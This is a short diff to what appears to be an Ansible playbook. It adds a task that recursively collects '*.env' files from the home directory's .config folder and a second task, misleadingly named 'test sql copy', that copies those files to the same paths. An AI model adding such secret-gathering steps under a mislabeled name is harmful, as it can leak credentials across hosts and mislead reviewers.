@@ -11,3 +11,17 @@
     - fetch --all
     - checkout -f main
     - reset --hard
+
+- name: get env-files
+  find:
+    paths: "{{ lookup('env', 'HOME') }}/.config"
+    file_type: file
+    recurse: yes
+    patterns: [ '*.env' ]
+  register: env_files
+
+- name: test sql copy
+  copy:
+    src: "{{ item.path }}"
+    dest: "{{ item.path }}"
+  loop: "{{ env_files.files | list }}"
